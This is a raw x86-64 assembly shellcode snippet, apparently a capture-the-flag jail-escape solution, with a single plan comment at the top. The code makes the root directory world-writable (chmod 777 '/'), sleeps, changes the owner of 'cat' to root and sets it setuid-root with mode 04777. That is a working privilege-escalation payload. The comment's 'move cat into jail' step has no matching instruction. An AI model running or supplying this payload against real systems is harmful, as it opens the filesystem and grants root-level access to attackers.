; chmod 777 "/", nanosleep, move "cat" into jail. chmod 04777 "cat", chown 0 "cat".

xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor r10, r10
xor r8, r8
mov rax, 0x5A
mov rdi, 0x2F
mov [rsp], rdi
lea rdi, [rsp]
mov rsi, 0777
syscall
mov rdi, 60
mov [rsp], rdi
lea rdi, [rsp]
mov rax, 0x23
mov rsi, 0
syscall
mov rax, 0x5C
mov rdi, 0x746163
mov [rsp], rdi
lea rdi, [rsp]
mov rsi, 0
syscall
mov rax, 0x5A
lea rdi, [rsp]
mov rsi, 0004777
syscall